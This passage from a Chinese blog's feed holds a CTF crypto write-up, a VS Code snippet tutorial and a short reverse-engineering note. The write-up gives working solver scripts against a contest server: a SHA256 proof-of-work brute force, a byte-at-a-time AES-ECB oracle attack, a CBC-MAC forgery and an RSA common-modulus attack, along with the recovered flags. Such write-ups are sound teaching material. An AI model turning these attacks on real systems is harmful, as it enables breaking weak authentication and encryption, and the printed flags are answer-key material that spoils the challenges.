class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passSha</span>(<span class="params">S256data1, S256data2</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">                    xxxx = i+j+a+b</span><br><span class="line">                    tmp1 = xxxx + S256data1</span><br><span class="line">                    tmp2 = sha256(tmp1.encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> tmp2 == S256data2:</span><br><span class="line">                        <span class="built_in">print</span>(xxxx)</span><br><span class="line">                        <span class="keyword">return</span> xxxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    client = remote(<span class="string">&#x27;120.78.131.38&#x27;</span>, <span class="number">10086</span>)  <span class="comment"># 120.78.131.38</span></span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    S256data1 = <span class="built_in">str</span>(data)[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">print</span>(S256data1)</span><br><span class="line">    S256data2 = <span class="built_in">str</span>(data)[<span class="number">34</span>:-<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(S256data2)</span><br><span class="line"></span><br><span class="line">    xxxx = passSha(S256data1, S256data2)</span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    client.sendline(xxxx.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # get flag2: kSUKUMYeRf0wXFX&#125;</span></span><br><span class="line"><span class="string">    data = client.recvline()</span></span><br><span class="line"><span class="string">    print(data)</span></span><br><span class="line"><span class="string">    partflag = &quot;&quot;</span></span><br><span class="line"><span class="string">    for n in range(15, 0, -1):</span></span><br><span class="line"><span class="string">        for i in dic:</span></span><br><span class="line"><span class="string">            t = (&#x27;0&#x27;*8 + &#x27;0&#x27;*n + partflag + f&#x27;&#123;i&#125;&#x27; + &#x27;0&#x27;*n).encode()</span></span><br><span class="line"><span class="string">            client.sendline(t)</span></span><br><span class="line"><span class="string">            data = client.recvline()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            hdata = str(data)[25:-4]</span></span><br><span class="line"><span class="string">            bdata = binascii.unhexlify(hdata)</span></span><br><span class="line"><span class="string">            n1 = bdata[16:32]</span></span><br><span class="line"><span class="string">            n2 = bdata[32:48]</span></span><br><span class="line"><span class="string">            data = client.recvline()</span></span><br><span class="line"><span class="string">            if n1 == n2:</span></span><br><span class="line"><span class="string">                partflag += i</span></span><br><span class="line"><span class="string">                print(partflag)</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># get flag1: D0g3&#123;AtkkSUKUMYeRf0wXFX&#125;0000000</span></span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    t = (<span class="string">&#x27;0&#x27;</span>).encode()</span><br><span class="line">    client.sendline(t)</span><br><span class="line">    data = client.recvline()</span><br><span class="line">    hdata = <span class="built_in">str</span>(data)[<span class="number">25</span>:-<span class="number">4</span>]</span><br><span class="line">    bdata = binascii.unhexlify(hdata)</span><br><span class="line">    aes = AES.new(<span class="string">&#x27;kSUKUMYeRf0wXFX&#125;&#x27;</span>.encode(), AES.MODE_ECB)</span><br><span class="line">    <span class="built_in">print</span>(aes.decrypt(bdata))</span><br><span class="line">solve()</span><br></pre></td></tr></table></figure><h3 id="3-Cry3"><a href="#3-Cry3" class="headerlink" title="3. Cry3"></a>3. Cry3</h3><p>problem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">hint = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">GOD = [<span class="string">b&#x27;Whitfield__Diffie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message</span>):</span><br><span class="line">    message = pad(message, <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv=<span class="string">b&#x27;\x00&#x27;</span> * AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(aes.encrypt(message)[-<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authentication = encrypt(<span class="string">b&#x27;Whitfield__Diffie&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CryptoPalace</span>(socketserver.StreamRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof1</span>(<span class="params">self</span>):</span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        random_str = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        str_sha256 = hashlib.sha256(random_str.encode()).hexdigest()</span><br><span class="line">        self.request.sendall((<span class="string">&#x27;SHA256(XXXX + %s):%s\n&#x27;</span> % (random_str[<span class="number">4</span>:], str_sha256)).encode())</span><br><span class="line">        self.request.sendall(<span class="string">&#x27;Give Me XXXX:\n&#x27;</span>.encode())</span><br><span class="line">        XXXX = self.request.recv(<span class="number">2048</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256((XXXX + random_str[<span class="number">4</span>:].encode())).hexdigest() != str_sha256:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof2</span>(<span class="params">self</span>):</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;You must prove your identity to enter the palace &#x27;</span> + Authentication + <span class="string">b&#x27;\n--&gt; &#x27;</span>)</span><br><span class="line">        name = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(encrypt(name))</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">in</span> GOD:</span><br><span class="line">            self.request.sendall(<span class="string">b&#x27;You are not him!\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> encrypt(name) != Authentication:</span><br><span class="line">            self.request.sendall(<span class="string">b&#x27;Wrong, try again......\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.request.sendall(hint.encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">DiffieEncrypt</span>(<span class="params">self</span>):</span><br><span class="line">        p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">        E = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        e1, e2, e3 = E[<span class="number">0</span>] * E[<span class="number">1</span>], E[<span class="number">0</span>] * E[<span class="number">2</span>], E[<span class="number">1</span>] * E[<span class="number">2</span>]</span><br><span class="line">        n = p * q</span><br><span class="line">        m = bytes_to_long(flag)</span><br><span class="line">        c1, c2, c3 = <span class="built_in">pow</span>(m, e1, p * q), <span class="built_in">pow</span>(m, e2, p * q), <span class="built_in">pow</span>(m, e3, p * q)</span><br><span class="line">        <span class="keyword">return</span> n, e1, e2, e3, c1, c2, c3</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof1():</span><br><span class="line">            self.request.sendall(<span class="string">b&#x27;Error Hash!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof2():</span><br><span class="line">            self.request.sendall(<span class="string">b&#x27;You did not enter the palace\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;Flag has been encrypted by Diffie\n&#x27;</span>)</span><br><span class="line">        cipher = self.DiffieEncrypt()</span><br><span class="line">        self.request.sendall(<span class="built_in">str</span>(cipher).encode())</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host, port = <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10010</span></span><br><span class="line">    server = ThreadedTCPServer((host, port), CryptoPalace)</span><br><span class="line">    ThreadedTCPServer.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    ThreadedTCPServer.allow_reuse_port = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一道proof是pass sha256，不再说了。</p><p>第二道pass是类似于字节翻转攻击的应该，因为这里我们知道第二块加密的结果，还可以控制第三块的明文，那就能将第三块加密的初始状态模仿为为第一块加密的初始状态，第四块模仿认证加密时的第二块即可。</p><p>第三道加密用三次共模攻击即可。</p><p>solve</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passSha</span>(<span class="params">S256data1, S256data2</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">                    xxxx = i+j+a+b</span><br><span class="line">                    tmp1 = xxxx + S256data1</span><br><span class="line">                    tmp2 = sha256(tmp1.encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> tmp2 == S256data2:</span><br><span class="line">                        <span class="built_in">print</span>(xxxx)</span><br><span class="line">                        <span class="keyword">return</span> xxxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join([<span class="built_in">bytes</span>([x ^ y]) <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># pass proof-1</span></span><br><span class="line">    client = remote(<span class="string">&#x27;120.78.131.38&#x27;</span>, <span class="number">10010</span>)  <span class="comment"># 120.78.131.38</span></span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    S256data1 = <span class="built_in">str</span>(data)[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">print</span>(S256data1)</span><br><span class="line">    S256data2 = <span class="built_in">str</span>(data)[<span class="number">34</span>:-<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(S256data2)</span><br><span class="line">    xxxx = passSha(S256data1, S256data2)</span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    client.sendline(xxxx.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># pass proof-2</span></span><br><span class="line">    data = client.recv(<span class="number">86</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    Authentication = data.strip().decode()[<span class="number">49</span>:-<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(Authentication)</span><br><span class="line">    Authentication = binascii.unhexlify(Authentication)</span><br><span class="line"></span><br><span class="line">    payload = pad(<span class="string">b&#x27;Whitfield__Diffie&#x27;</span>, <span class="number">16</span>) + xor(<span class="string">b&#x27;Whitfield__Diffi&#x27;</span>, Authentication) + <span class="string">b&#x27;e&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    client.send(payload)</span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    data = client.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pass proof-3</span></span><br><span class="line">    data = client.recvall()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># solve()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n, e1, e2, e3, c1, c2, c3 = (<span class="number">19120571621573694829160397307516835376872507953729802598093827160887060889034360832819752577859233559598831301254001011809703821403472183514235929610121693106391058233725519223609312991940162653280997703685777710373285746380705828950234579791564316257282877099317848254581317127598098827968411644708987250916578721789106702972244844171094312539960727894661092802368446221651965713370185288336447558314193857998115598640461379506360472185746153570357676623002998012676576740009964025386147791415782847290050295864105454049046965549658991689655730929842688087404811834817788102144230210185631207570081557562376446540247</span>, <span class="number">102581440898056241318128214537924496869526480372609835497341654857026062932198977573681743623742921945767171867383150710105237628964612924978999099656317014562983112269448310027942319241258063004523625418360492485902025122158775015513145548133479817300070908401799628198614323242768007042008772490958137620009</span>, <span class="number">84861117397769225539821760582007929845040444708897654039387108780051690712702957713394483239294900959776488564710070450482648007186934000316591344973986886185023477222185643601688624252603915654443461258707970859618917817042168203651271717630795417178229766438876526068209768034374640396575495277467207793057</span>, <span class="number">74550020795637885597176972263429831225922775544952553291494222512780495669760791223333870184576709618265404286750042208246950271204928549386849631830235313978882422435308267932980084901151223592760458759448145641039858939902412194838774486122310510020492762908393663226360917149950916053559850720707359018393</span>, <span class="number">16701448820440044971367143248683815391435271330229466577235925795466165967749529062134204660793846805595684591120297032066438468101978733848460279622553638275780772702352278103317742991131033138458527606303217372769758462129475732613664074616098849535236896047117184763819796427445284430910594953211347685563105849533658048519080664766538903444129726763921572215460540042215620120149103998123362737013296082338419843935969728252887921123426163777148725713356037421662108777917084462585096220236535814271677878699353460892121980146413263244563577728235580851612731765431082675815088962239601467767365816988545146467679</span>, <span class="number">4604153284825391395829559274259567061412211939724595373546044046671863619805554646224768336025594366364892614151115755374017182264034106919766014107984320188536706520297622520678697638554092096320449003114047913621671445027484537187024371757016418378954808880317922412122590916062611598322362761730424292307666354434060090092910024405430455718205858182730638259112103563828150521512460538871216823666097941284244450641732875583740294066637970327827182878746309539676755011100492850725801544241574439622290176282985893538353679489132738843363588185622519918535948744802093458914126820294715804006078431130925015721686</span>, <span class="number">6244345776243347148117594423778270500896562768577572461366647087225601296793340514892683908742920161999286857229696684489878244927755965872409017410429309120846973619642483320453946969260458149761636717684475710186244679167462936090030863012102778866145674041405278531750726671076467328868041579419183433876556009070402242266129862490596547537245340302860530263676930918658716412422278862709593363356131468529303441823173396173598310980336806944936719171989455441296617606014394901155734603287327137279021048348745944829505420113098099144555338597262278034366840470563563684227011355165312215859586719825297145674834</span>)</span><br><span class="line">E0 = gmpy2.gcd(e1, e2)</span><br><span class="line">E1 = gmpy2.gcd(e1, e3)</span><br><span class="line">E2 = gmpy2.gcd(e2, e3)</span><br><span class="line"><span class="built_in">print</span>(E0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ext_euclid</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = ext_euclid(b, a % b)  <span class="comment"># q = gcd(a, b) = gcd(b, a%b)</span></span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">same_mod</span>(<span class="params">n, e1, e2, c1, c2</span>):</span><br><span class="line">    s, t, q = ext_euclid(e1, e2)</span><br><span class="line">    m = (gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n)) % n  <span class="comment"># powmod进行大数运算</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">me0 = same_mod(n, E1, E2, c1, c2)</span><br><span class="line"><span class="built_in">print</span>(me0)</span><br><span class="line"></span><br><span class="line">me1 = same_mod(n, E0, E2, c1, c3)</span><br><span class="line"><span class="built_in">print</span>(me1)</span><br><span class="line"></span><br><span class="line">m = same_mod(n, E0, E1, me0, me1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;D0g3&#123;New_3ra_@f_PK_Crypt0graphy_1976&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode新建模板文件</title>
      <link href="/2022/09/03/vscode%E6%96%B0%E5%BB%BA%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6/"/>
      <url>/2022/09/03/vscode%E6%96%B0%E5%BB%BA%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p><strong>最近需要练习C++才有的这个需要，感觉每个c++文件都要先写个#include …，这样有点重复性劳动的意思，所以想着能不能新建文件，里面直接就有模板内容，所以百度学习了一下。</strong></p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>文件 &#x3D;》首选项 &#x3D;》配置用户代码片段</p><p><img src="/2022/09/03/vscode%E6%96%B0%E5%BB%BA%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6//image-20220903212029249.png" alt="image-20220903212029249"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>选择cpp文件。ctrl a + ctrl v</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;Print to conaole&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C++&quot;</span><span class="punctuation">,</span>    <span class="comment">//在新建立的页面中输入C++就会有智能提示，Tab就自动生成好了</span></span><br><span class="line"><span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;#include &lt;iostream&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;#include &lt;cmath&gt;&quot;</span><span class="punctuation">,</span>     <span class="comment">//这个头文件可以删除，我为了使用方便就加了</span></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">//空行</span></span><br><span class="line"><span class="string">&quot;using namespace std;&quot;</span><span class="punctuation">,</span> <span class="comment">//标准命名空间</span></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;int main()&quot;</span><span class="punctuation">,</span>   <span class="comment">//main()函数</span></span><br><span class="line"><span class="string">&quot;&#123;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;   $0&quot;</span><span class="punctuation">,</span>    <span class="comment">//最终光标会在这里等待输入</span></span><br><span class="line"><span class="string">&quot;   system(\&quot;pause\&quot;);&quot;</span><span class="punctuation">,</span>    <span class="comment">//标准C++的等待用户动作</span></span><br><span class="line"><span class="string">&quot;   return 0;&quot;</span><span class="punctuation">,</span> <span class="comment">//结束</span></span><br><span class="line"><span class="string">&quot;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A cpp file template.&quot;</span>   <span class="comment">//用户输入后智能提示的内容（你可以用中文写“生成C++模板”）</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>上面原作者写得很详细嗷。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://zhuanlan.zhihu.com/p/100504877">VScode中创建你的代码模板. Evil rabbit.</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow内部赛reverse</title>
      <link href="/2022/06/01/ctfshow%E5%86%85%E9%83%A8%E8%B5%9Breverse/"/>
      <url>/2022/06/01/ctfshow%E5%86%85%E9%83%A8%E8%B5%9Breverse/</url>
      
        <content type="html"><![CDATA[<h3 id="真的是签到"><a href="#真的是签到" class="headerlink" title="真的是签到"></a>真的是签到</h3><p>压缩包是加密的，拖到爆破工具里面，发现是伪加密，直接十六进制编辑工具改一下即可。</p><p><img src="/2022/06/01/ctfshow%E5%86%85%E9%83%A8%E8%B5%9Breverse//image-20220601231719729.png" alt="image-20220601231719729"></p><p>拖出来之后使用peid查壳，aspack没太见过的壳，这里竟然不是经典upx壳，大失所望。</p><p><img src="/2022/06/01/ctfshow%E5%86%85%E9%83%A8%E8%B5%9Breverse//image-20220601231817629.png" alt="image-20220601231817629"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow萌新赛Reverse</title>
      <link href="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse/"/>
      <url>/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse/</url>
      
